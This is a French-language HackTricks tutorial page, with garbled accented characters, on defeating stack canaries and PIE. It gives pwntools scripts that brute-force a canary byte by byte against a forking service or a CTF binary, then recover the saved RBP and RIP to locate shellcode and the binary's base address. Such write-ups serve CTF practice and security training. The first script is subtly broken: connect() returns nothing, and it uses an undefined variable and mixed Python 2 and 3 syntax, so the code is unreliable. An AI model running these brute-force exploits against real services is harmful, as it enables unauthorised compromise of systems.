<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**Si vous Ãªtes confrontÃ© Ã  un binaire protÃ©gÃ© par un canari et PIE (Position Independent Executable), vous devez probablement trouver un moyen de les contourner.**

![](<../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
Notez que **`checksec`** pourrait ne pas trouver qu'un binaire est protÃ©gÃ© par un canari s'il a Ã©tÃ© compilÃ© de maniÃ¨re statique et qu'il n'est pas capable d'identifier la fonction.\
Cependant, vous pouvez le remarquer manuellement si vous trouvez qu'une valeur est enregistrÃ©e dans la pile au dÃ©but d'un appel de fonction et que cette valeur est vÃ©rifiÃ©e avant de sortir.
{% endhint %}

# Brute force Canary

La meilleure faÃ§on de contourner un simple canari est si le binaire est un programme **qui crÃ©e des processus enfants Ã  chaque fois que vous Ã©tablissez une nouvelle connexion** avec lui (service rÃ©seau), car chaque fois que vous vous connectez Ã  lui, **le mÃªme canari sera utilisÃ©**.

Ensuite, la meilleure faÃ§on de contourner le canari est simplement de le **forcer par caractÃ¨re**, et vous pouvez savoir si le byte de canari devinÃ© Ã©tait correct en vÃ©rifiant si le programme a plantÃ© ou continue son flux rÃ©gulier. Dans cet exemple, la fonction **force un canari de 8 octets (x64)** et distingue entre un byte correctement devinÃ© et un byte incorrect simplement en **vÃ©rifiant** si une **rÃ©ponse** est renvoyÃ©e par le serveur (une autre faÃ§on dans **d'autres situations** pourrait Ãªtre d'utiliser un **try/except**):

## Exemple 1

Cet exemple est implÃ©mentÃ© pour 64 bits mais pourrait Ãªtre facilement implÃ©mentÃ© pour 32 bits.
```python
from pwn import *

def connect():
    r = remote("localhost", 8788)

def get_bf(base):
    canary = ""
    guess = 0x0
    base += canary

    while len(canary) < 8:
        while guess != 0xff:
            r = connect()

            r.recvuntil("Username: ")
            r.send(base + chr(guess))

            if "SOME OUTPUT" in r.clean():
                print "Guessed correct byte:", format(guess, '02x')
                canary += chr(guess)
                base += chr(guess)
                guess = 0x0
                r.close()
                break
            else:
                guess += 1
                r.close()

    print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
    return base
    
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
## Exemple 2

Ceci est implÃ©mentÃ© pour 32 bits, mais cela pourrait Ãªtre facilement modifiÃ© pour 64 bits.\
Notez Ã©galement que pour cet exemple, **le programme s'attend d'abord Ã  un octet pour indiquer la taille de l'entrÃ©e** et la charge utile.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
	known_canary = b""
	test_canary = 0x0
	len_bytes_to_read = 0x21
	
	for j in range(0, 4):
		# Iterate up to 0xff times to brute force all posible values for byte
		for test_canary in range(0xff):
			print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")
			
			# Send the current input size
			target.send(len_bytes_to_read.to_bytes(1, "little"))

			# Send this iterations canary
			target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

			# Scan in the output, determine if we have a correct value
			output = target.recvuntil(b"exit.")
			if b"YUM" in output:
				# If we have a correct value, record the canary value, reset the canary value, and move on
				print(" - next byte is: " + hex(test_canary))
				known_canary = known_canary + test_canary.to_bytes(1, "little")
				len_bytes_to_read += 1
				break

	# Return the canary
	return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
# Afficher le Canary

Une autre faÃ§on de contourner le canary est de **l'afficher**.\
Imaginez une situation oÃ¹ un **programme vulnÃ©rable** Ã  un dÃ©bordement de pile peut exÃ©cuter une fonction **puts** pointant vers une **partie** du **dÃ©bordement de pile**. L'attaquant sait que le **premier octet du canary est un octet nul** (`\x00`) et que le reste du canary est composÃ© d'octets **alÃ©atoires**. Ensuite, l'attaquant peut crÃ©er un dÃ©bordement qui **Ã©crase la pile jusqu'au premier octet du canary**.\
Ensuite, l'attaquant **appelle la fonctionnalitÃ© puts** sur le milieu de la charge utile qui **affichera tout le canary** (sauf le premier octet nul).\
Avec ces informations, l'attaquant peut **crÃ©er et envoyer une nouvelle attaque** en connaissant le canary (dans la mÃªme session de programme)

Ã‰videmment, cette tactique est trÃ¨s **limitÃ©e** car l'attaquant doit Ãªtre capable d'**afficher** le **contenu** de sa **charge utile** pour **extraire** le **canary** et ensuite Ãªtre capable de crÃ©er une nouvelle charge utile (dans la **mÃªme session de programme**) et **envoyer** le **vrai dÃ©bordement de tampon**.\
Exemple de CTF : [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)

# PIE

Pour contourner le PIE, vous devez **fuir une adresse**. Et si le binaire ne fuit pas d'adresses, le mieux Ã  faire est de **forcer le RBP et le RIP enregistrÃ©s dans la pile** dans la fonction vulnÃ©rable.\
Par exemple, si un binaire est protÃ©gÃ© Ã  la fois par un **canary** et **PIE**, vous pouvez commencer Ã  forcer le canary, puis les **8 octets suivants** (x64) seront le **RBP** enregistrÃ© et les **8 octets suivants** seront le **RIP** enregistrÃ©.

Pour forcer le RBP et le RIP Ã  partir du binaire, vous pouvez dÃ©terminer qu'un octet devinÃ© valide est correct si le programme produit quelque chose ou s'il ne plante pas. La **mÃªme fonction** que celle fournie pour forcer le canary peut Ãªtre utilisÃ©e pour forcer le RBP et le RIP :
```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
## Obtenir l'adresse de base

La derniÃ¨re chose dont vous avez besoin pour vaincre le PIE est de calculer des adresses utiles Ã  partir des adresses divulguÃ©es : le **RBP** et le **RIP**.

Ã€ partir du **RBP**, vous pouvez calculer **oÃ¹ vous Ã©crivez votre shell dans la pile**. Cela peut Ãªtre trÃ¨s utile pour savoir oÃ¹ vous allez Ã©crire la chaÃ®ne _"/bin/sh\x00"_ Ã  l'intÃ©rieur de la pile. Pour calculer la distance entre le RBP divulguÃ© et votre shellcode, vous pouvez simplement mettre un **point d'arrÃªt aprÃ¨s avoir divulguÃ© le RBP** et vÃ©rifier **oÃ¹ se trouve votre shellcode**, puis vous pouvez calculer la distance entre le shellcode et le RBP :
```python
INI_SHELLCODE = RBP - 1152
```
Ã€ partir du **RIP**, vous pouvez calculer l'**adresse de base du binaire PIE** dont vous aurez besoin pour crÃ©er une **chaÃ®ne ROP valide**.\
Pour calculer l'adresse de base, il suffit de faire `objdump -d vunbinary` et de vÃ©rifier les derniÃ¨res adresses de dÃ©sassemblage :

![](<../../.gitbook/assets/image (145).png>)

Dans cet exemple, vous pouvez voir qu'il ne faut que **1 byte et demi** pour localiser tout le code, puis l'adresse de base dans cette situation sera le **RIP divulguÃ© mais se terminant par "000"**. Par exemple, si vous avez divulguÃ© _0x562002970**ecf**_, l'adresse de base est _0x562002970**000**_.
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
